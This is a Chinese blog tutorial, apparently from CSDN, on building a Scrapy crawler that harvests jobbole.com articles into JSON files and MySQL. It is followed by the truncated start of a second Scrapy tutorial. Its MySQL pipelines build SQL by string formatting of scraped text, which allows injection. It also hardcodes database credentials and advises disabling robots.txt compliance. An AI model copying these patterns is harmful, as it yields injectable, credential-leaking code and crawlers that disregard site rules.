http://blog.jobbole.com/111469/，F12进入浏览器调试窗口，从全文分析，比如我们想获取文章标题，文章内容，文章创建时间，点赞数，评论数，收藏数，文章所属类别标签，文章出处等信息 \n\n\n\n使用 scrapy shell 的方法获取解析网页数据\n\n打开文章链接，我们获取到的是一个html页面，那么如何获取上面所说的那些数据呢，本文通过 CSS 选择器来获取(不了解 CSS selector的小伙伴可以先去熟悉一下 http://www.w3school.com.cn/cssref/css_selectors.asp)。 scrape 为我们提供了一个 shell 的环境，可以方便我们进行调试和实验，验证我们的css 表达式能够成功获取所需要的值。下面启动 scrapy shell\n\nscrapy shell \"http://blog.jobbole.com/111469/\"\n\n\nscrapy 将会帮助我们将http://blog.jobbole.com/111469/这个链接的数据捕获，现在来获取一下文章标题，在浏览器中找到文章标题，inspect element 审查元素，如下图所示：\n\n文章标题为王垠：如何掌握所有的程序语言，从上图获知，这个位于一个 class 名为 entry-header 的 div 标签下的子标签 h1 中，那我们在 scrapy shell 通过 css 选择器来获取一下，如下图所示：\n\n仔细查看上图，注意一些细节。通过 response.css 方法，返回的结果是一个 selector，不是字符串，在这个 selector 的基础上可以继续使用 css 选择器。通过 extract() 函数获取提取的标题内容，返回结果是一个 list，注意，这里是一个 list ，仍然不是字符串 str，使用 extract()[0] 返回列表中的第一个元素，即我们需要的标题。\n\n但是，如果标题没有获取到，或者选择器返回的结果为空的话，使用 extract()[0] 就会出错，因为试图对一个空链表进行访问，这里使用 extract_first() 方法更加合适，可是使用一个默认值，当返回结果为空的时候，返回这个默认值\n\nextract_first(\"\")   # 默认值为 \"\"\n\n\n此处仅仅是将 title 标题作为一个例子进行说明，其他的就不详细进行解释了，主要代码如下所示：\n\n    title = response.css(\".entry-header h1::text\").extract()[0]\n    match_date = re.match(\"([0-9/]*).*\",\n                          response.css(\".entry-meta-hide-on-mobile::text\").extract()[0].strip())\n    if match_date:\n        create_date = match_date.group(1)\n\n    votes_css = response.css(\".vote-post-up h10::text\").extract_first()\n    if votes_css:\n        vote_nums = int(votes_css)\n    else:\n        vote_nums = 0\n\n    ma_fav_css = re.match(\".*?(\\d+).*\",\n                          response.css(\".bookmark-btn::text\").extract_first())\n    if ma_fav_css:\n        fav_nums = int(ma_fav_css.group(1))\n    else:\n        fav_nums = 0\n\n    ma_comments_css = re.match(\".*?(\\d+).*\",\n                               response.css(\"a[href='#article-comment'] span::text\").extract_first())\n    if ma_comments_css:\n        comment_nums = int(ma_comments_css.group(1))\n    else:\n        comment_nums = 0\n\n    tag_lists_css = response.css(\".entry-meta-hide-on-mobile a::text\").extract()\n    tag_lists_css = [ele for ele in tag_lists_css if not ele.strip().endswith('评论')]\n    tags = ','.join(tag_lists_css)\n\n    content = response.css(\".entry *::text\").extract()\n\n\n解释一下 create_date，通过获取到的值，存在其他非时间的数据，通过 re.match 使用正则表达式来提取时间。\n\n好了，所有需要的值都提取成功后，下面通过 scrapy 框架来创建我们的爬虫项目。\n\n\n\n创建爬虫项目\n\n开始我们的爬虫项目\n\nscrapy startproject ArticleSpider\n\n\nscrapy 会为我们创建一个名为 ArticleSpider 的项目 \n进入到 ArticleSpider 目录，使用basic模板创建\n\nscrapy genspider jobbole blog.jobbole.com\n\n\n创建完成之后，我们使用 pycharm 这个IDE打开我们创建的爬虫项目，目录结构如下所示： \n\n├── ArticleSpider\n│   ├── items.py\n│   ├── middlewares.py\n│   ├── pipelines.py\n│   ├── __pycache__\n│   ├── settings.py\n│   ├── spiders\n│   │   ├── __init__.py\n│   │   ├── jobbole.py\n│   │   └── __pycache__\n└── scrapy.cfg\n\n\n我们可以在 items.py 里面定义数据保存的格式，在 middlewares.py 定义中间件，在 piplines.py 里面处理数据，保存到文件或者数据库中等。在 jobbole.py 中对爬取的页面进行解析。\n\n下面，我们首先需要做的，就是利用我们编写的 css 表达式，获取我们提取的文章的值。在 jobbole.py 中，我们看到\n\nclass JobboleSpider(scrapy.Spider):\n    name = 'jobbole'\n    allowed_domains = ['blog.jobbole.com']\n    start_urls = ['http://blog.jobbole.com/all-posts/']\n\n    def parse(self, response):\n    pass\n\n\nscrapy 为我们创建了一个 JobboleSpider 的类，name 是爬虫项目的名称，同时定义了域名以及爬取的入口链接。scrapy 初始化的时候，会初始化 start_urls 入口链接列表，然后通过 start_requests 返回 Request 对象进行下载，调用 parse 回调函数对页面进行解析，提取需要的值，返回 item。\n\n所以，我们需要做的，就是将我们在上一小节编写的代码放在 parse 函数中，同时，将 start_urls 的值，改为上面我们在 scrapy shell 爬取的页面的地址http://blog.jobbole.com/111469/，因为我们这里还没有讲到通过 item 获取我们提取的值，此处你可以通过 print() 函数将值进行打印。在 shell 中启动爬虫（先进入我们的工程目录）\n\nscrapy crawl jobbole\n\n\n既然我们使用了 pycharm 这个IDE，那么我们就不用 shell 来启动爬虫，在 ArticleSpider 目录下创建一个 main.py 文件\n\nfrom scrapy.cmdline import execute\nimport sys\nimport os\n\nsys.path.append(os.path.dirname(os.path.abspath(__file__)))\nexecute([\"scrapy\", \"crawl\", \"jobbole\"])\n\n\n上面的代码，就是将当前项目路径加入到 path 中，然后通过调用scrapy 命令行来启动我们的工程。然后，通过设置断点调试，一步一步查看我们的提取的变量的值是否正确。\n\n\n  注意：启动之前，将 settings.py 中的 ROBOTSTXT_OBEY 这个参数设置为 False\n\n\n这样，我们就爬取到了伯乐在线的这一篇文章了。\n\n\n\n扩展，爬取所有的文章\n\n既然我们已经能够获取到某一篇文章的数据，那么下面就来获取所有文章的链接。\n\n\n\n扩展一：获取所有 url 链接\n\n伯乐在线所有文章链接的入口地址为 http://blog.jobbole.com/all-posts/，通过浏览器进入调试模式查看文章列表的链接，如下图所示\n\n文章链接是在 id 为 archive 的 div 标签下的子 div 标签之下， class 为 post-thumb，这个下面的子标签 a 的 href 属性，仍使用上面说的 scrapy shell 的方法，如下图所示 \n\n可以看出，获得了当前页面所有的文章的 url，这仅仅是当前页面的所有 url，我们还需要获取下一页的 url，然后通过下一页的 url 进入到下一页，获取下一页的所有文章的 url，依次类推，知道爬取完所有的文章 url。\n\n在文章列表的最后，有翻页，分析如下\n\n下一页是 class 为 next page-numbers 的 a 标签中，如下图 \n\n既然现在所有的 url 都能够获取到了，那么现在我们将 jobbole.py 中的 parse 函数修改一下\n\ndef parse(self, response):\n    post_nodes = response.css(\"#archive .floated-thumb .post-thumb\")    # a selector, 可以在这个基础上继续做 selector\n\n    for post_node in post_nodes:\n        post_url = post_node.css(\"a::attr(href)\").extract_first(\"\")\n        yield Request(url=parse.urljoin(response.url, post_url),\n                      callback=self.parse_detail)\n\n    # 必须考虑到有前一页，当前页和下一页链接的影响，使用如下所示的方法\n    next_url = response.css(\"span.page-numbers.current+a::attr(href)\").extract_first(\"\")\n     if next_url:\n         yield Request(url=parse.urljoin(response.url, next_url), callback=self.parse)\n\ndef parse_detail(self, response):\n\"\"\"作为回调函数，在上面调用\"\"\"\ntitle = response.css(\".entry-header h1::text\").extract()[0]\n    match_date = re.match(\"([0-9/]*).*\",\n                          response.css(\".entry-meta-hide-on-mobile::text\").extract()[0].strip())\n    if match_date:\n        create_date = match_date.group(1)\n\n    votes_css = response.css(\".vote-post-up h10::text\").extract_first()\n    if votes_css:\n        vote_nums = int(votes_css)\n    else:\n        vote_nums = 0\n\n    ma_fav_css = re.match(\".*?(\\d+).*\",\n                          response.css(\".bookmark-btn::text\").extract_first())\n    if ma_fav_css:\n        fav_nums = int(ma_fav_css.group(1))\n    else:\n        fav_nums = 0\n\n    ma_comments_css = re.match(\".*?(\\d+).*\",\n                               response.css(\"a[href='#article-comment'] span::text\").extract_first())\n    if ma_comments_css:\n        comment_nums = int(ma_comments_css.group(1))\n    else:\n        comment_nums = 0\n\n    tag_lists_css = response.css(\".entry-meta-hide-on-mobile a::text\").extract()\n    tag_lists_css = [ele for ele in tag_lists_css if not ele.strip().endswith('评论')]\n    tags = ','.join(tag_lists_css)\n\n    # cpyrights = response.css(\".copyright-area\").extract()\n    content = response.css(\".entry *::text\").extract()\n\n\n1. 获取文章列表页中的文章url，交给 scrapy 下载后并进行解析，即调用 parse 函数解析 \n2. 然后获取下一页的文章 url，按照1 2 循环\n\n对于 parse 函数，一般做三种事情 \na. 解析返回的数据 response data \nb. 提取数据，生成 ITEM \nc. 生成需要进一步处理 URL 的 Request 对象 \n\n\n  某些网站中，url 仅仅只是一个后缀，需要将当前页面的url+后缀进行拼接，使用的是 parse.urljoin(base, url)，如果 urljoin 中的 url 没有域名，将使用base进行拼接，如果有域名，将不会进行拼接,此函数在 python3 的 urllib 库中。Request(meta参数)：meta参数是一个字典{},作为回调函数的参数\n\n\n这样，我们就获得了所有的文章\n\n\n\n扩展二：使用item，并保存图片到本地\n\n上一小节提到了， parse 函数提取数据之后，生成 item，scrapy 会通过 http 将 item 传到 pipeline 进行处理，那么这一小节，我们使用 item 来接收 parse 提取的数据。在 items.py 文件中，定义一个我们自己的数据类 JobBoleArticleItem，并继承 scrapy.item 类\n\nclass JobBoleArticleItem(scrapy.Item):\n    title = scrapy.Field()          # Field()能够接收和传递任何类型的值,类似于字典的形式\n    create_date = scrapy.Field()    # 创建时间\n    url = scrapy.Field()            # 文章路径\n    front_img_url_download = scrapy.Field()\n    fav_nums = scrapy.Field()       # 收藏数\n    comment_nums = scrapy.Field()   # 评论数\n    vote_nums = scrapy.Field()      # 点赞数\n    tags = scrapy.Field()           # 标签分类 label\n    content = scrapy.Field()        # 文章内容\n    object_id = scrapy.Field()      # 文章内容的md5的哈希值，能够将长度不定的 url 转换成定长的序列\n\n\nField() 对象，能够接收和传递任何类型的值，看源代码，就能发现，Field() 类继承自 dict 对象，具有字典的所有属性。\n\n注意，在上面定义的类中，我们增加了一个新的成员变量 front_img_url_download，这是保存的是文章列表中，每一个文章的图片链接。我们需要将这个图片下载到本地环境中。既然使用了 item 接收我们提取的数据，那么 parse 函数就需要做相应的改动\n\ndef parse(self, response):\n    post_nodes = response.css(\"#archive .floated-thumb .post-thumb\")    # a selector, 可以在这个基础上继续做 selector\n\n    for post_node in post_nodes:\n        post_url = post_node.css(\"a::attr(href)\").extract_first(\"\")\n        img_url = post_node.css(\"a img::attr(src)\").extract_first(\"\")\n        yield Request(url=parse.urljoin(response.url, post_url),\n                      meta={\"front-image-url\":img_url}, callback=self.parse_detail)\n\n    # 必须考虑到有前一页，当前页和下一页链接的影响，使用如下所示的方法\n    next_url = response.css(\"span.page-numbers.current+a::attr(href)\").extract_first(\"\")\n     if next_url:\n         yield Request(url=parse.urljoin(response.url, next_url), callback=self.parse)\n\n\n同时，解析函数 parse_detail 也需要修改，将数据保存到我们的item中，只需要添加下面的部分就可\n\n    front_img_url = response.meta.get(\"front-image-url\", \"\")\n    article_item = JobBoleArticleItem() # 实例化 item 对象\n    # 赋值 item 对象\n    article_item[\"title\"] = title\n    article_item[\"create_date\"] = create_date\n    article_item[\"url\"] = response.url\n    article_item[\"front_img_url_download\"] = [front_img_url] # 这里传递的需要是列表的形式，否则后面保存图片的时候，会出现类型错误，必须是可迭代对象\n    article_item[\"fav_nums\"] = fav_nums\n    article_item[\"comment_nums\"] = comment_nums\n    article_item[\"vote_nums\"] = vote_nums\n    article_item[\"tags\"] = tags\n    # article_item[\"cpyrights\"] = cpyrights\n    article_item[\"content\"] = ''.join(content)      # 取出的 content 是一个 list ,存入数据库的时候，需要转换成字符串\n    article_item[\"object_id\"] = gen_md5(response.url)\n    yield article_item\n\n\n这里，parse 函数成功生成了我们定义的 item 对象，将数据传递到 pipeline。那么，图片链接已经获取到了，我们如下将图片下载下来呢。\n\n\n  解释一下上面代码中的 front-img-url，这个是在 parse 函数中作为参数 meta 传递给 Request() 函数，回调函数调用 parse_detail，返回的 response 对象中的 meta 成员，将包含这个元素， meta 就是一个字典， response.meta.get(“front-image-url”) 将获取到我们传递过来的图片url\n\n\nscrapy 提供了一个 ImagesPipeline 类，可直接用于图片操作，只需要我们在 settings.py 文件中进行配置即可。\n\n在 settings.py 中，有一个配置参数为 ITEM_PIPELINE，这其实就是一个字典，当需要用到 pipeline 时，就需要在这个字典中进行配置，字典中存在的， scrapy 才会使用。字典中的 key 就是 pipeline 的类名，后面的数字表示优先级，数字越小表示越先调用，越大越靠后。既然我们现在需要使用到 scrapy 提供的图片下载功能，那么需要在这个字典中配置 ImagesPipeline\n\nITEM_PIPELINES = {\n   'scrapy.pipelines.images.ImagesPipeline': 1,\n}\n\n\n同时，还需要在 settings.py 中配置，item 中哪一个字段是图片 url，以及图片需要存放什么位置\n\nIMAGES_URLS_FIELD = \"front_img_url_download\"     # ITEM 中的图片 URL，用于下载\nPROJECT_IMAGE_PATH = os.path.abspath(os.path.dirname(__file__))   # 获取当前文件所在目录\nIMAGES_STORE = os.path.join(PROJECT_IMAGE_PATH, \"images\")         # 下载图片的保存位置\n\n\n这些参数，可以在 ImagesPipeline 类的源代码中查看到\n\n\n  注意：上面配置好后，上面的代码是在工程路径下面创建一个 images 的目录，用于保存图片，运行 main.py，可能会出现如下错误: no module named PIL，这是因为图片操作需要 pillow 库，只需要安装即可 \n  pip install pillow，快速安装，就按照我上面说的豆瓣源的方法。\n  还可能出现”ValueError: Missing scheme in request url: h”的错误，这是因为图片操作，要求 front_img_url_download 的值为 list 或者可以迭代的对象，所以我们在 parse 函数中给 item 赋值的时候， front_img_url_download 就是赋值的 list 对象\n\n\n好了，这些注意了之后，应该能够下载图片了。\n\n\n\n扩展三：使用 itemloader\n\n相信大家已经发现，虽然使用了 item，但是使用 css selecotor，我们的 parse 函数显得很长，而且，当数据量越来越大之后，一大堆的 css 表达式是很难维护的。在加上正则表达式的提取，代码会显得很臃肿。这里，给大家推荐是用 itemloader。itemloader 可以看成是一个容器。\n\n首先，在 items.py 中，我们需要定义一个继承自 ItemLoader 的类\n\nclass ArticleItemLoader(ItemLoader):\n    \"\"\"\n    自定义 ItemLoader, 就相当于一个容器\n    \"\"\"\n    # 这里表示，输出获取的 ArticleItemLoader 提取到的值，都是 list 中的第一个值\n    # 如果有的默认不是取第一个值，就在 Field() 中进行修改\n    default_output_processor = TakeFirst()\n\n\n将默认输出函数定为 TakeFirst()，即取结果 list 中的第一个值，定义了 ItemLoader 类之后，需要修改 jobbole.py 中的 parse_detail 函数了，现在就不再直接使用 css selector 了，使用 itemloader 中的 css 进行数据提取，新的 parse_detail 如下所示：\n\ndef parse_detail(self, response):\n    front_img_url = response.meta.get(\"front-image-url\", \"\")\n    item_loader = ArticleItemLoader(item=JobBoleArticleItem(), response=response)\n    article_item_loader = JobBoleArticleItem()\n    item_loader.add_css(\"title\", \".entry-header h1::text\")  # 通过 css 选择器获取值\n    item_loader.add_value(\"url\", response.url)\n    item_loader.add_css(\"create_date\", \".entry-meta-hide-on-mobile::text\")\n    item_loader.add_value(\"front_img_url_download\", [front_img_url])\n    item_loader.add_css(\"fav_nums\", \".bookmark-btn::text\")\n    item_loader.add_css(\"comment_nums\", \"a[href='#article-comment'] span::text\")\n    item_loader.add_css(\"vote_nums\", \".vote-post-up h10::text\")\n    item_loader.add_css(\"tags\", \".entry-meta-hide-on-mobile a::text\")\n    item_loader.add_css(\"content\", \".entry *::text\")\n    item_loader.add_value(\"object_id\", gen_md5(response.url))\n    # item_loader.add_xpath()\n    # item_loader.add_value()\n    article_item_loader = item_loader.load_item()\n    yield article_item_loader\n\n\n这样，数据提取就全部交给了 itemloader 来执行了。代码整体都简洁和工整了很多。ItemLoader 有三个方法用于提取数据，分别是 add_css(), add_xpath(), add_value()，前两个分别是 css 选择器和 xpath 选择器，如果是值，就直接使用 add_value() 即可。\n\n最后 load_item() 函数，将根据上面提供的规则进行数据解析，每一个解析的值都是以 list 结果的形式呈现，同时，将结果赋值 item。\n\n但是，大家应该已经发现，之前我们直接使用 css selector 提取数据的时候，对于某些数据，需要使用正则表达式进行匹配才能获取所需的值，这里什么都没做，仅仅是通过 itemloader 提取了数据而已。所以，我们还需要重新定义我们的 item 类，这些操作在 item 中进行处理。修改 items.py 中的 JobBoleArticleItem 类，具体如下：\n\nclass JobBoleArticleItem(scrapy.item):\n    title = scrapy.Field()\n    create_date = scrapy.Field(     # 创建时间\n        input_processor = MapCompose(get_date),\n        output_processor = Join(\"\")\n    )\n    url = scrapy.Field()            # 文章路径\n    front_img_url_download = scrapy.Field(    # 文章封面图片路径,用于下载，赋值时必须为数组形式\n        # 默认 output_processor 是 TakeFirst()，这样返回的是一个字符串，不是 list，此处必须是 list\n        # 修改 output_processor\n        output_processor = MapCompose(return_value)\n    )\n    front_img_url = scrapy.Field()\n    fav_nums = scrapy.Field(        # 收藏数\n        input_processor=MapCompose(get_nums)\n    )\n    comment_nums = scrapy.Field(    # 评论数\n        input_processor=MapCompose(get_nums)\n    )\n    vote_nums = scrapy.Field(       # 点赞数\n        input_processor=MapCompose(get_nums)\n    )\n    tags = scrapy.Field(           # 标签分类 label\n        # 本身就是一个list, 输出时，将 list 以 commas 逗号连接\n        input_processor = MapCompose(remove_comment_tag),\n        output_processor = Join(\",\")\n    )\n    content = scrapy.Field(        # 文章内容\n        # content 我们不是取最后一个，是全部都要，所以不用 TakeFirst()\n        output_processor=Join(\"\")\n    )\n    object_id = scrapy.Field()      # 文章内容的md5的哈希值，能够将长度不定的 url 转换成定长的序列\n\n\ninput_processor 对传入的值进行预处理， output_processor 对处理后的值按照规则进行处理和提取，比如 TakeFirst() 就是对处理的结果取第一个值。\n\ninput_processor = MapCompose(func1, func2, func3, ...) 这行代码，说明的是， Item 传入的这个字段的值，将会分别调用 MapCompose 中的所有传入的方法进行逐个处理，这个方法也是可以是 lambda 的匿名函数。\n\n因为上面定义 ArticleItemLoader 类的时候，使用了默认的 default_output_processor，如果不想使用默认的这个方法，就在 Field() 中，使用 output_processor 参数覆盖默认的方法，哪怕什么都不做，也不会使用默认方法获取数据了。对上面那些方法定义如下：\n\ndef get_nums(value):\n    \"\"\"\n    通过正则表达式获取 评论数，点赞数和收藏数\n    \"\"\"\n    re_match = re.match(\".*?(\\d+).*\", value)\n    if re_match:\n        nums = (int)(re_match.group(1))\n    else:\n        nums = 0\n\n    return nums\n\n\ndef get_date(value):\n    re_match = re.match(\"([0-9/]*).*?\", value.strip())\n    if re_match:\n        create_date = re_match.group(1)\n    else:\n        create_date = \"\"\n    return create_date\n\ndef remove_comment_tag(value):\n    \"\"\"\n    去掉 tag 中的 “评论” 标签\n    \"\"\"\n    if \"评论\" in value:\n        return \"\"\n    else:\n        return value\n\n\ndef return_value(value):\n    \"\"\"\n    do nothing, 只是为了覆盖 ItemLoader 中的 default_processor\n    \"\"\"\n    return value\n\n\n千万注意：这些方法，每一个最后，都必须有 return，否则程序到后面将获取不到这个字段的数据，再次访问这个字段的时候，就会报错。\n\n\n\n扩展四：将数据导出到 json 文件中\n\n好了，既然已经将数据通过 ItemLoader 获取到了，那么我们现在就将数据从 pipeline 输出到 json 文件中。\n\n将数据以 json 格式输出，可以通过 json 库的方法，也可以使用 scrapy.exporters 的方法。\n\n\n\njson 库\n\n我们已经知道，对数据的处理，scrapy 是在 pipeline 中进行的，所以，我们需要在 pipelines.py 中定义我们对数据的导出操作。创建一个新类\n\nclass JsonWithEncodingPipeline(object):\n    \"\"\"\n    处理 item 数据，保存为json格式的文件中\n    \"\"\"\n    def __init__(self):\n        self.file = codecs.open('article.json', 'w', encoding='utf-8')\n\n    def process_item(self, item, spider):\n        lines = json.dumps(dict(item), ensure_ascii=False) + '\\n'   # False，才能够在处理非acsii编码的时候，不会出错，尤其\n        #中文\n        self.file.write(lines)\n        return item     # 必须 return\n\n    def spider_close(self, spider):\n        \"\"\"\n        把文件关闭\n        \"\"\"\n        self.file.close()\n\n\n__init__() 构造对象的时候，就打开文件，scrapy 会调用 process_item() 函数对数据进行处理，在这个函数中，将数据以 json 的格式写入文件中。操作完成之后，将文件关闭。思路很简单。\n\n\n\nscrapy.exporters 的方式\n\nclass JsonExporterPipeline(object):\n\n    def __init__(self):\n        \"\"\"\n        先打开文件，传递一个文件\n        \"\"\"\n        self.file = open('articleexporter.json', 'wb')\n        #调用 scrapy 提供的 JsonItemExporter导出json文件\n        self.exporter = JsonItemExporter(self.file, encoding=\"utf-8\", ensure_ascii=False)\n        self.exporter.start_exporting()\n\n    def spider_close(self, spider):\n        self.exporter.finish_exporting()\n        self.file.close()\n\n    def process_item(self, item, spider):\n        self.exporter.export_item(item)\n        return item\n\n\nscrapy.exporters 提供了几种不同格式的文件支持，能够将数据输出到这些不同格式的文件中，查看 JsonItemExporter 源码即可获知\n\n__all__ = ['BaseItemExporter', 'PprintItemExporter', 'PickleItemExporter',\n           'CsvItemExporter', 'XmlItemExporter', 'JsonLinesItemExporter',\n           'JsonItemExporter', 'MarshalItemExporter']\n\n\n这些就是 scrapy 支持的文件。方法名称都差不多，这算是 scrapy 运行 pipeline 的模式，只需要将逻辑处理放在 process_item()，scrapy 就会根据规则对数据进行处理。\n\n当然，要想使我们写的数据操作有效，别忘记了，在 settings.py 中进行配置\n\nITEM_PIPELINES = {\n\n  'scrapy.pipelines.images.ImagesPipeline': 1,\n  'ArticleSpider.pipelines.JsonWithEncodingPipeline': 2,\n  'ArticleSpider.pipelines.JsonExporterPipeline':3,\n}\n\n\n\n\n扩展五：将数据存储到 MySQL 数据库\n\n前面介绍了将数据以 json 格式导出到文件，那么将数据保存到 MySQL 中，如何操作，相信大家已经差不多了然于胸了。这里也介绍两种方法，一种是通过 MySQLdb 的API来实现的数据库存取操作，这种方法简单，适合用与数据量不大的场合，如果数据量大，数据库操作的速度跟不上数据解析的速度，就会造成数据拥堵。那么使用第二种方法就更好，使用 twisted 框架提供的异步操作方法，不会造成拥堵，速度更快。\n\n既然是入 MySQL 数据库，首先肯定是需要创建数据库表了。表结构如下图所示： \n\n上图中有一个字段的值，我没有讲述怎么取，就是 front_img_path 这个值，大家在数据库入库的时候，直接用空置或者空字符串填充即可。这个字段是保存图片在本地保存的路径，这个需要在 ImagesPipe 的 item_completed(self, results, item, info) 方法中的 results 参数中获取。\n\n好了，数据库表创建成功之后，下面就来将数据入库了。\n\n\n\nMySQLdb 的方法入库\n\nclass MysqlPipeline(object):\n    def __init__(self):\n        # 连接数据库\n        self.conn = MySQLdb.connect('192.168.0.101', 'spider', 'wuzhenyu', 'article_spider', charset=\"utf8\", use_unicode=True)\n        self.cursor = self.conn.cursor()\n\n    def process_item(self, item, spider):\n        insert_sql = \"\"\"\n            insert into article(title, create_date, url, url_object_id, front_img_url, front_img_path, comment_nums, \n            fav_nums, vote_nums, tags, content) VALUES ('%s', '%s', '%s', '%s', '%s', '%s', %d, %d, %d, '%s', '%s')\n        \"\"\" % (item[\"title\"], item[\"create_date\"], item[\"url\"], item[\"object_id\"],item[\"front_img_url\"],\n               item[\"front_img_path\"], item[\"comment_nums\"], item[\"fav_nums\"], item[\"vote_nums\"], item[\"tags\"],\n               item[\"content\"])\n\n        self.cursor.execute(insert_sql)\n        self.conn.commit()\n\n    def spider_close(self, spider):\n        self.cursor.close()\n        self.conn.close()\n\n\n如果对 API 想了解的更多，就去阅读 python MySQLdb 的相关API文档说明，当然，要想这个生效，首先得在 settings.py 文件中将这个 pipeline 类加入 ITEM_PIPELINE 字典中\n\nITEM_PIPELINES = {\n\n  'scrapy.pipelines.images.ImagesPipeline': 1,\n  'ArticleSpider.pipelines.JsonWithEncodingPipeline': 2,\n  'ArticleSpider.pipelines.JsonExporterPipeline':3,\n  'ArticleSpider.pipelines.MysqlPipeline': 4,\n}\n\n\n\n\n通过 Twisted 框架提供的异步方法入库\n\nclass MysqlTwistedPipeline(object):\n    \"\"\"\n    利用 Twisted API 实现异步入库 MySQL 的功能\n    Twisted 提供的是一个异步的容器，MySQL 的操作还是使用的MySQLDB 的库\n    \"\"\"\n    def __init__(self, dbpool):\n        self.dbpool = dbpool\n\n    @classmethod\n    def from_settings(cls, settings):\n        \"\"\"\n        被 spider 调用，将 settings.py 传递进来，读取我们配置的参数\n        模仿 images.py 源代码中的 from_settings 函数的写法\n        \"\"\"\n        # 字典中的参数，要与 MySQLdb 中的connect 的参数相同\n        dbparams = dict(\n            host = settings[\"MYSQL_HOST\"],\n            db = settings[\"MYSQL_DBNAME\"],\n            user = settings[\"MYSQL_USER\"],\n            passwd = settings[\"MYSQL_PASSWORD\"],\n            charset = \"utf8\",\n            cursorclass = MySQLdb.cursors.DictCursor,\n            use_unicode = True\n        )\n\n        # twisted 中的 adbapi 能够将sql操作转变成异步操作\n        dbpool = adbapi.ConnectionPool(\"MySQLdb\", **dbparams)\n        return cls(dbpool)\n\n    def process_item(self, item, spider):\n        \"\"\"\n        使用 twisted 将 mysql 操作编程异步执行\n        \"\"\"\n        query = self.dbpool.runInteraction(self.do_insert, item)\n        query.addErrback(self.handle_error) # handle exceptions\n\n    def handle_error(self, failure):\n        \"\"\"\n        处理异步操作的异常\n        \"\"\"\n        print(failure)\n\n    def do_insert(self, cursor, item):\n        \"\"\"\n        执行具体的操作，能够自动 commit\n        \"\"\"\n        print(item[\"create_date\"])\n        insert_sql = \"\"\"\n                    insert into article(title, create_date, url, url_object_id, front_img_url, front_img_path, comment_nums, \n                    fav_nums, vote_nums, tags, content) VALUES ('%s', '%s', '%s', '%s', '%s', '%s', %d, %d, %d, '%s', '%s');\n                \"\"\" % (item[\"title\"], item[\"create_date\"], item[\"url\"], item[\"object_id\"], item[\"front_img_url\"],\n                       item[\"front_img_path\"], item[\"comment_nums\"], item[\"fav_nums\"], item[\"vote_nums\"], item[\"tags\"],\n                       item[\"content\"])\n\n        # self.cursor.execute(insert_sql, (item[\"title\"], item[\"create_date\"], item[\"url\"], item[\"object_id\"],\n        #                                 item[\"front_img_url\"], item[\"front_img_path\"], item[\"comment_nums\"],\n        #                                 item[\"fav_nums\"], item[\"vote_nums\"], item[\"tags\"], item[\"content\"]))\n        print(insert_sql)\n        cursor.execute(insert_sql)\n\n\n博主也是近一个多星期开始学习爬虫的 scrapy 框架，对 Twisted 框架也不怎么熟悉，上面的代码是一个例子，大家可以看下注释，等以后了解更多会补充更多相关知识。\n\n需要提到的是，上面定义的 from_settings(cls. settings) 这个类方法， scrapy 会从 settings.py \n文件中读取配置进行加载，这里将 MySQL 的一些配置信息放在了 settings.py 文件中，然后使用 from_settings 方法直接获取，在 settings.py 中需要添加如下代码：\n\n# MySQL params\nMYSQL_HOST = \"\"\nMYSQL_DBNAME = \"article_spider\"\nMYSQL_USER = \"spider\"\nMYSQL_PASSWORD = \"\"\n\n\n\n  本篇文章，主要以 scrapy 框架爬取伯乐在线文章为例，简要介绍了 scrapy 爬取数据的一些方法，博主也是最近才开始学习爬虫，有不对的地方还请大家能够指正。\n\n\n\n\nwindows 中安装环境与 Ubuntu 会有一些不一样，而且如果使用的是 python3.x 版本，会要求 vc++ 的版本比较高，最好安装的是 visual studio 2015 以上的版本。否则会很麻烦。\n\n对于 python2.7版本，在windows中，可以安装 VSForPython27.msi ，依赖的那些库应该就不会再出错了。", "time": "2018_08_14_11_12_29", "link": "https://blog.csdn.net/honglicu123/article/details/74906223", "title": "scrapy简单入门 - 爬取伯乐在线所有文章"}
{"timestamp": "2018_08_14_11_12_29", "desc": "Scrapy框架学习（二）—-Item Pipeline(管道)和Scrapy Shell\n\n\n\nItem Pipeline（管道）\n\n当Item在Spider中被收集之后，它将会被传递到Item Pipeline，一些组件会按照一定的顺序执行对Item进行处理。\n\n每个Item Pipeline都是实现了简单方法的Python类，比如决定此Item是丢弃而存储。以下是Item Pipeline的典型应用：\n\n\n验证爬取的数据（检查爬取的数据是否包含某些字段，数据清洗）\n查重（重复的数据丢弃）\n将爬取的结果保存到文件或数据库\n\n\n编写Item Pipeline类\n\n在pipelines.py文件中定义一个Pipeline类，同时必须实现下面的方法：\n\n\n\nprocess_item(self,item,spider)\n\n每个item pipeline组件都需要调用该方法，这个方法必须返回一个Item对象，或是抛出DropItem异常，被丢弃的item将不会被之后的pipeline组件处理。\n\n代码如下：\n\n\n\nimport json\n\nclass BaiduPipeline(object):\n\n    def process_item(self, item, spider):\n        \"\"\"\n        处理item的方法，处理业务逻辑，保存数据，返回item\n\n        :param item: 是items.py中定义item类\n        :param spider: 是spiders目录中定义的Spider类\n        :return: 返回需要的item数据（经过清洗，业务逻辑处理后的item数据）\n        \"\"\"\n\n        print(spider)   # 输出 <BaiDuSpider 'baidu' at 0x2133caee358>\n        print(type(spider)) # 输出 <class 'scrapydemo.spiders.baidu_spider.BaiDuSpider'>\n        print(spider.name) # 输出 baidu\n\n        print(item) # 输出 {'title': '百度一下'}\n        print(type(item)) # 输出 <class 'scrapydemo.items.BaiduItem'>\n\n        with open('baidu.json', 'w') as f:\n            jsondata = json.dumps(dict(item))\n            f.write(jsondata)\n\n        return item\n\nPipeline 除此之外还可以实现以下方法：\n\n\nopen_spider(self, spider)\n\n当spider被开启是调用该方法。\n\nspider参数：被开启的spider对象\nclose_spider(self, spider)\n\n当spider被关闭时，这个方法被调用\n\nspider参数：被关闭的spider对象\n\n\n在settings配置Item Pipeline\n\n在settings.py文件中，将ITEM_PIPELINES，注释打开，将我们编写的Item Pipeline配置好。\n\n\n\nITEM_PIPELINES = {\n    # 我们写好的Pipeline的路径，300表示优先级，范围（0-1000），越小级别越高\n    'scrapydemo.pipelines.BaiduPipeline': 300,\n}\n\n\n\n\n\nScrapy Shell\n\nScrapy shell是一个交互终端，在未启动spider的情况下尝试及调试你的爬取代码。其本意是用来测试提取数据的代码。不过也可以将其当做正常的Python终端，在上面测试任何的Python代码。\n\n该终端是用来测试XPath或CSS表达式，查看他们的工作方式及爬取的网页中提取的数据。该终端提供了交互性测试您的表达式代码的功能，免去了每次修改后运行spider的麻烦。\n\n启动终端\n\n进入项目的根目录，执行下面的命令，启动shell，以\"http://www.baidu.com\"为例，如下：\n\n\n  scrapy shell 